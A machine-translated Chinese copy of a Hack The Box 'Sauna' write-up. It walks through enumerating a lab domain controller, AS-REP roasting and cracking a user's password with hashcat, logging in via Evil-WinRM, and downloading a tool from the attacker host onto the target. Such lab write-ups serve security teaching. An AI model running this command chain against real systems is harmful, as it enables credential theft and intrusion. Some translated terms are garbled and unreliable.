<html>
<head>
<title>Hack the Box — Sauna Write-up(w/ Covenant C2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑盒子—桑拿浴报道(与圣约C2合作)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hack-the-box-sauna-write-up-w-covenant-c2-c2d71141c90b?source=collection_archive---------1-----------------------#2020-07-18">https://infosecwriteups.com/hack-the-box-sauna-write-up-w-covenant-c2-c2d71141c90b?source=collection_archive---------1-----------------------#2020-07-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/078033631b5670c0c333bb985496ea3c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/format:webp/1*bWIokIpyCQOm97k6hdCMSw.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/229" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/229</a></figcaption></figure><p id="18b7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">桑拿是由<a class="ae jy" href="https://www.hackthebox.eu/home/users/profile/94858" rel="noopener ugc nofollow" target="_blank">利己主义者</a>创造的一个由易到难的机器。我觉得这个框是现实的，因为它需要你根据他们的公共网站来设计潜在的用户名。我还决定展示一个C2框架，其中我选择了<a class="ae jy" href="https://github.com/cobbr/Covenant" rel="noopener ugc nofollow" target="_blank"> Covenant，</a>这也是我在Hack the Box的离岸实验室中使用的同一个C2。</p><h2 id="85e6" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">总结一下解决箱子问题的步骤:</h2><p id="5504" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated"><strong class="kb ir">最初的落脚点:</strong></p><ul class=""><li id="ab2f" class="lv lw iq kb b kc kd kg kh kk lx ko ly ks lz kw ma mb mc md bi translated">通过常用惯例生成潜在用户名</li><li id="2731" class="lv lw iq kb b kc me kg mf kk mg ko mh ks mi kw ma mb mc md bi translated">识别易受代理攻击的用户</li><li id="e142" class="lv lw iq kb b kc me kg mf kk mg ko mh ks mi kw ma mb mc md bi translated">用户是<code class="fe mj mk ml mm b">Remote Management Users</code>的一部分，使用<code class="fe mj mk ml mm b">WinRM</code>登录</li></ul><p id="9787" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><strong class="kb ir"> Fsmith → svc_loanmgr </strong></p><ul class=""><li id="8dd1" class="lv lw iq kb b kc kd kg kh kk lx ko ly ks lz kw ma mb mc md bi translated">枚举并识别留在<code class="fe mj mk ml mm b">Windows AutoLogon</code>注册表中的凭据</li></ul><p id="1680" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><strong class="kb ir">SVC _ loan mgr→管理员</strong></p><ul class=""><li id="b586" class="lv lw iq kb b kc kd kg kh kk lx ko ly ks lz kw ma mb mc md bi translated">用户对该域拥有<code class="fe mj mk ml mm b">GetChanges-All</code>权限</li><li id="1373" class="lv lw iq kb b kc me kg mf kk mg ko mh ks mi kw ma mb mc md bi translated">数据同步</li></ul><h1 id="7e30" class="mn ky iq bd kz mo mp mq lc mr ms mt lf mu mv mw li mx my mz ll na nb nc lo nd bi translated">扫描:</h1><p id="95f7" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">我首先运行<code class="fe mj mk ml mm b">masscan</code>来快速识别开放的端口:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="4623" class="kx ky iq mm b gy nm nn l no np">sudo masscan -p1-65535,U:1-65535 10.10.10.175 --rate=1000 -e tun0</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/6ca2197c1e083e109378d4c0a1328891.png" data-original-src="https://miro.medium.com/v2/resize:fit:776/format:webp/1*jmQembMR_VDASuX0w7-jkw.png"/></div></figure><p id="063c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">根据开放的端口，如53，389，636，我可以有把握地假设这个机器是一个Windows服务器，作为域控制器。然后我继续运行默认的<code class="fe mj mk ml mm b">nmap</code>扫描:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="9880" class="kx ky iq mm b gy nm nn l no np">sudo nmap -sV -sC -oA nmap/initial 10.10.10.175 -vv -n</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi nr"><img src="../Images/3b087483db216c84564bef42a204b6df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0pp0jTUtUXvcGVS0bHiRlw.png"/></div></div></figure><p id="ef5e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">除了端口80是<code class="fe mj mk ml mm b">open</code>之外，没有什么有趣的东西返回。扫描还告诉我这个域名是<code class="fe mj mk ml mm b">EGOTISTICAL-BANK</code>。然后，我决定先列举一些常见的Windows协议。</p><h2 id="dc80" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">Windows RPC —端口135</h2><p id="c18d" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">我试图使用rpcclient建立一个空会话。这在现代的Windows系统中已经不起作用了，但是你永远不会知道它是否允许你枚举关于主机或域本身的信息。当试图列出域用户时，我得到了<code class="fe mj mk ml mm b">access denied </code>。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/2f557a768213d488db982bb55d176ddf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/1*6w6KmP0Gh1Rm1DieFw1KiQ.png"/></div></figure><p id="ad10" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我尝试用<code class="fe mj mk ml mm b">lsaquery</code>来获取域SID。我还试图使用<code class="fe mj mk ml mm b">lookupnames</code>将域名转换成SID，但得到的是<code class="fe mj mk ml mm b">access denied</code>。</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="3a0c" class="kx ky iq mm b gy nm nn l no np">rpcclient $&gt; lsaquery<br/>Domain Name: EGOTISTICALBANK<br/>Domain Sid: S-1-5-21-2966785786-3096785034-1186376766<br/>rpcclient $&gt; lookupnames administrator<br/>result was NT_STATUS_ACCESS_DENIED</span></pre><p id="204a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我转向LDAP。</p><p id="5c27" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><strong class="kb ir"> LDAP —端口389 </strong></p><p id="75c6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">LDAP可以以多种方式列举。我可以使用大多数Linux系统中都有的<code class="fe mj mk ml mm b">ldapsearch</code>，或者使用特定于LDAP的nmap脚本。我使用了<code class="fe mj mk ml mm b">ldapsearch</code>并尝试以匿名用户的身份绑定，将base指定为scope:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="0f2f" class="kx ky iq mm b gy nm nn l no np">ldapsearch -x -h 10.10.10.175 -s base</span></pre><p id="8dc5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我不能得到很多，为了简洁，我也截取了输出。输出中的一些有用信息提到<code class="fe mj mk ml mm b">domainFunctionality</code>、<code class="fe mj mk ml mm b">forestFunctionality</code>和<code class="fe mj mk ml mm b">domainControllerFunctionality</code>是7。</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="eaf7" class="kx ky iq mm b gy nm nn l no np">dn:                                                                                                                                                                            <br/>domainFunctionality: 7                                                                                                                                                         <br/>forestFunctionality: 7                                                                                                                                                         <br/>domainControllerFunctionality: 7                                                                                                                                               <br/>rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL</span></pre><h2 id="0d79" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">端口445 —中小型企业</h2><p id="fe21" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">为了列举SMB，我使用了使用<code class="fe mj mk ml mm b">-L</code>标志的<code class="fe mj mk ml mm b">smbclient,</code>列表。我发现我可以匿名认证，但不能列出任何股份。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/5bbec8b7dfb87534b031094ddab020e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1096/format:webp/1*TzZNkFDxm2-BLhFKVBetWA.png"/></div></figure><p id="582d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">发现没什么有趣的，我开始列举<code class="fe mj mk ml mm b">HTTP</code>。</p><h2 id="d57a" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">HTTP —端口80</h2><p id="98a8" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">查看网页，好像公司是银行。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ny"><img src="../Images/07fc0263ee63d3b2d67e965f701eb781.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GgJ3AX0BnwemGTXieCD_sg.png"/></div></div></figure><p id="e11f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">继续向下滚动，我找到了客户的照片，并提到了<code class="fe mj mk ml mm b">“… I can’t even get a ticket to roast my chestnuts”</code>。这暗示着我得用“烤”做点什么。在活动目录攻击的背景下，<code class="fe mj mk ml mm b">AS-REP roast</code>和<code class="fe mj mk ml mm b">Kerberosting</code>浮现在脑海中。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi nz"><img src="../Images/8c335afb3d6bdac6984a887a7cd101e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wuDH6p3_MoUd_cZRa246rw.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">index.html</figcaption></figure><p id="a787" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我使用dirsearch在页面上运行了一次目录暴力，指定检查扩展名为<code class="fe mj mk ml mm b">aspx</code>、<code class="fe mj mk ml mm b">html</code>和<code class="fe mj mk ml mm b">txt</code>的文件。我没发现什么有趣的东西。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oa"><img src="../Images/9f6024401e51fabee72b3e30fa1d9c84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ErgDmSvu0Fk9uowx6AGolA.png"/></div></div></figure><p id="af07" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我浏览了网站，发现<code class="fe mj mk ml mm b"> /about.html</code>提到了<code class="fe mj mk ml mm b">Admin</code>的一些帖子。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/19b48ef92280eafce6c9cd59a927318b.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*zWTR9otLHJuwrDQY89cpxA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">/about.html</figcaption></figure><p id="ddf2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还找到了<code class="fe mj mk ml mm b">/contact.html</code>，上面有联系方式。我试着发送随机数据，并用打嗝来拦截它:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oc"><img src="../Images/f8316fa199742a003762e8e4725bd960.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7Wwn4Mbd9I-qL13LFXBSwg.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">/contact.html</figcaption></figure><p id="ac4c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">通过打嗝检查请求:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/96570fd717e979b5742b5e264091436e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1176/format:webp/1*D-7ve_1Hf6_JbvgHiMpdAA.png"/></div></figure><p id="38c1" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">向<code class="fe mj mk ml mm b">error 405</code>发送请求结果。means <code class="fe mj mk ml mm b">POST</code>方法不允许，所以这种接触形式是死路一条。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/6fa760526fd6596d697d60dbb113ed4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:632/format:webp/1*bnSQX2LDePIgxiQVOYqE4A.png"/></div></figure><p id="c7ca" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">查看其他页面，发现<code class="fe mj mk ml mm b">/about.html</code>。它提到了一些用户是他们团队的一部分，并大声疾呼。它也给了我们几个名字，我们可以尝试从中生成用户名。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi of"><img src="../Images/50a9657971d4f7ec729092931819346e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7GIvuieauru59rTvneu5ow.png"/></div></div></figure><p id="4170" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查网页上的其他内容，似乎没有什么有用的东西，只是占位符。</p><h2 id="014c" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">砷焙烧</h2><p id="5fd1" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">知道我有几个名字，我可以试着生成一个潜在用户名约定的单词列表。由于没有其他服务可供我们认证或登录，这很可能意味着我需要向AD认证。由于有一些关于“烘焙”的提示，我决定尝试AS-REP烘焙。代理烘烤是对Kerberos的一种攻击，在这种攻击中，您可以请求由未启用预验证的用户加密的数据。我在我的<a class="ae jy" href="https://medium.com/bugbountywriteup/hackthebox-forest-5a11553de1" rel="noopener">森林文章</a>中解释了更多的概念。所以我的名字如下:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="aada" class="kx ky iq mm b gy nm nn l no np">fergus smith<br/>hugo bear<br/>steven kerb<br/>shaun coins<br/>bowie taylor<br/>sophie driver</span></pre><p id="3f89" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">从全名派生用户名的一种常见方法是用“点”分隔名和姓，如下所示:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="ad0c" class="kx ky iq mm b gy nm nn l no np">fergus.smith<br/>hugo.bear<br/>steven.kerb<br/>shaun.coins<br/>bowie.taylor<br/>sophie.driver</span></pre><p id="3c82" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">另一种常见的方法是使用名字的第一个字母后跟一个点，然后是姓氏，如下所示:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="a121" class="kx ky iq mm b gy nm nn l no np">f.smith<br/>h.bear<br/>s.kerb<br/>s.coins<br/>b.taylor<br/>s.driver</span></pre><p id="1142" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">另一种方法是在姓后面加上名的第一个字母，就像这样:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="792e" class="kx ky iq mm b gy nm nn l no np">fsmith<br/>hbear<br/>skerb<br/>scoins<br/>btaylor<br/>sdriver</span></pre><p id="2976" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">有了三种可能的用户名模式，我创建了一个单词列表:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="50ac" class="kx ky iq mm b gy nm nn l no np">fergus.smith<br/>hugo.bear<br/>steven.kerb<br/>shaun.coins<br/>bowie.taylor<br/>sophie.driver<br/>f.smith<br/>h.bear<br/>s.kerb<br/>s.coins<br/>b.taylor<br/>s.driver<br/>fsmith<br/>hbear<br/>skerb<br/>scoins<br/>btaylor<br/>sdriver</span></pre><p id="b406" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我使用impacket的GetNPUsers继续检查易受AS-REP攻击的用户:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="d610" class="kx ky iq mm b gy nm nn l no np">/opt/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users1.txt -dc-ip 10.10.10.175</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi og"><img src="../Images/c856fbbbb1b324a3a1888721e5ef9286.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WjU5iRQLgz9LD0p1-mQQMw.png"/></div></div></figure><p id="b799" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这导致用户<code class="fe mj mk ml mm b">fsmith</code>用AS-REP响应，稍后我们可以使用hashcat破解它。即使这种技术没有返回易受攻击的用户，这也可以帮助您识别有效的域用户。请注意，当错误为<code class="fe mj mk ml mm b">KDC_ERR_C_PRINCIPAL_UNKNOWN</code>时，该用户不是有效的域用户。这可以通过使用<code class="fe mj mk ml mm b">Administrator</code>用户名进行测试来验证，我确信这个用户名是存在的:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="72ed" class="kx ky iq mm b gy nm nn l no np">/opt/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/Administrator -dc-ip 10.10.10.175</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/4e861f0a5aecf70df1f0e0552fab0da3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1386/format:webp/1*y8PpKJSjFkAf3x5VpiCL-Q.png"/></div></figure><p id="23c5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">响应是UF_DONT_REQUIRE_PREAUTH设置，这意味着为该用户启用了预验证。继续，我将返回的AS-REP放在一个文本文件中，并用<code class="fe mj mk ml mm b">hashcat</code>破解它:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="e318" class="kx ky iq mm b gy nm nn l no np">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/ad58a369d34f064868d4dff7550c2d7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*d17IGLVeUJlunhdDSeYsmg.png"/></div></figure><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/b5670be5666bb308e582fe84e67e8aff.png" data-original-src="https://miro.medium.com/v2/resize:fit:458/format:webp/1*MOkhd4ryi_w1BX5LZnjjaw.png"/></div></figure><p id="3bf0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">用户<code class="fe mj mk ml mm b">fsmith</code>的密码是<code class="fe mj mk ml mm b">Thestrokes23</code>。</p><p id="4524" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我使用crackmapexec(cme)检查凭证是否有效，并检查域的密码策略，这在CTF环境中不再有用，但在真正的测试中，这将为您提供关于帐户锁定和域中强制执行的最小密码长度等有价值的信息。</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="0cf7" class="kx ky iq mm b gy nm nn l no np">/opt/cme smb 10.10.10.175 -d EGOTISTICAL-BANK -u fsmith -p Thestrokes23 --pass-pol</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ok"><img src="../Images/023af5074d3cbfe9d11f0ba79c63c8af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pGN_bKMj9D2O8kYQpPwIew.png"/></div></div></figure><p id="a481" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还使用cme查看了可用的股票:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ol"><img src="../Images/503a64767600b108d23921c9dee1e9fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oA4NP05vSuaYHZCVcnPcug.png"/></div></div></figure><p id="99b8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还用smbmap检查了一下:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="749a" class="kx ky iq mm b gy nm nn l no np">/opt/smbmap/smbmap.py -H 10.10.10.175 -u fsmith -p Thestrokes23</span></pre><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi om"><img src="../Images/05f3f7138a0102f0f45e561281404186.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aPauUNd-utciMqO-b6WfDA.png"/></div></div></figure><p id="48a5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">为什么我做了两次？因为我想展示你如何用不同的工具完成一件事。因此，当cme或smbmap或smbclient(我在上面使用过)中的任何一个失败时，我仍然可以使用一些选项来实现我的目标。</p><p id="e325" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在检查这些共享之前，我首先列举了LDAP，因为我现在可以对域进行身份验证了:</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="0bbd" class="kx ky iq mm b gy nm nn l no np">ldapdomaindump 10.10.10.175 -u "egotistical-bank\fsmith" -p Thestrokes23  -o ldapdomaindump/ --no-json --no-grep</span></pre><p id="6b3d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查html输出，它显示了域用户及其成员的列表。值得注意的是，<code class="fe mj mk ml mm b">fsmith</code>是<code class="fe mj mk ml mm b">Remote Management Users</code>的一部分，这意味着用户最有可能在盒子上做<code class="fe mj mk ml mm b">PSRemoting</code>。还有另外一个用户<code class="fe mj mk ml mm b">svc_loanmgr</code>，网页中没有提到(当然因为是服务账号)。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi on"><img src="../Images/e2fd8c2e5816e67451536017b8cc9ff8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*Mhh65LI4mqvAzvIOpJJwGg.png"/></div></figure><p id="cfc2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">从ldapdomaindump的输出中，可以看到<code class="fe mj mk ml mm b">DONT_REQ_PREAUTH</code>是为<code class="fe mj mk ml mm b">fsmith</code>设置的，导致那个用户容易受到<code class="fe mj mk ml mm b">AS-REP</code>的烘烤。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oo"><img src="../Images/c92fc570de7e8a3d9eee0e5f622811fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LAqL8o3DEiHqJZD5rYfbYg.png"/></div></div></figure><p id="8741" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我可以通过各种方式与运行在端口<code class="fe mj mk ml mm b">5985</code>或<code class="fe mj mk ml mm b"> 5986(SSL)</code>上的<code class="fe mj mk ml mm b">PSRemoting</code>交互。因为我使用的是Kali，所以首选是<code class="fe mj mk ml mm b">Evil-WinRM</code>。我现在在盒子上有了一个初步的立足点。</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi op"><img src="../Images/8c5aab3fa7eb0a05425a2067212b4b3c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4vTaZviH1MiIk0y0HzQyZQ.png"/></div></div></figure><p id="719c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我在C:\users目录下递归地列出深度为3的文件和目录。<code class="fe mj mk ml mm b">Gci</code>是PowerShell中<code class="fe mj mk ml mm b">Get-ChildItem</code>的快捷方式。基本就是Windows CMD上的<code class="fe mj mk ml mm b">dir</code>或者Bash上的<code class="fe mj mk ml mm b">ls</code>。</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="662b" class="kx ky iq mm b gy nm nn l no np">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; gci -path c:\users\ -recurse -depth 3</span></pre><p id="20f7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我在盒子上找到用户:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/427cf25ba88661145d15668925d887a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1060/format:webp/1*G4MC4zVhjty3ohCFvLnozw.png"/></div></figure><p id="b108" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我还找到了<code class="fe mj mk ml mm b">fsmith’s</code>桌面下的<code class="fe mj mk ml mm b">user.txt</code>:</p><figure class="ne nf ng nh gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/13a67ef6d72bb8b235e40d1b72e38c7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*YcMBW6kup171_lbWMefqKQ.png"/></div></figure><h2 id="59e3" class="kx ky iq bd kz la lb dn lc ld le dp lf kk lg lh li ko lj lk ll ks lm ln lo lp bi translated">fsmith → svc_loanmgr</h2><p id="a5b2" class="pw-post-body-paragraph jz ka iq kb b kc lq ke kf kg lr ki kj kk ls km kn ko lt kq kr ks lu ku kv kw ij bi translated">为了列举我如何提升权限，我使用了<a class="ae jy" href="https://github.com/GhostPack/Seatbelt" rel="noopener ugc nofollow" target="_blank">安全带</a>，这是一个检查常见Windows配置的工具。我将该文件放在我的Python http服务器上，并下载到机器上。</p><pre class="ne nf ng nh gt ni mm nj nk aw nl bi"><span id="b94a" class="kx ky iq mm b gy nm nn l no np">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; iwr -uri <a class="ae jy" href="http://10.10.14.3/s.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.3/s.exe</a> -o ..\music\s.exe</span></pre><p id="10c4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我用<code class="fe mj mk ml mm b">-group=all</code>选项运行<code class="fe mj mk ml mm b">Seatbelt</code>，因为我想让蓝队找到我。请注意，这是非常嘈杂的，因此在实际参与中，不要运行<code class="fe mj mk ml mm b">-group=all</code>选项。</p><figure class="ne nf ng nh gt jr gh 